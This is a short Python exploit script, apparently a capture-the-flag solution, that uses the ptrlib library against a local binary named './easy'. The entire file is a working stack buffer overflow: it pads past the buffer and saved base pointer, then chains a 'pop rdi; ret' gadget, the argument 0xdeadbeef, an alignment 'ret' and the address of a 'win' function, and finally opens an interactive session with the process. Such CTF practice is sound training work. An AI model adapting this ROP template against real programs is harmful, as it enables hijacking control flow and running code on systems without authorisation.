from ptrlib import *

bin_file = './easy'

def attack(conn):
   
    elf = ELF(bin_file)
    payload = b'A' * 32 # buf
    payload += b'b' * 8 # sbp

    payload += p64(next(elf.gadget("pop rdi; ret"))) # for set rdi
    payload += p64(0xdeadbeef) # set this to rdi to get over if state
    payload += p64(next(elf.gadget("ret"))) # for avoid moveups segv
    payload += p64(elf.symbol('win')) # get win addr

    conn.sendline(payload)

if __name__ == '__main__':
    conn = process(bin_file)
    # input()
    attack(conn)
    conn.interactive()
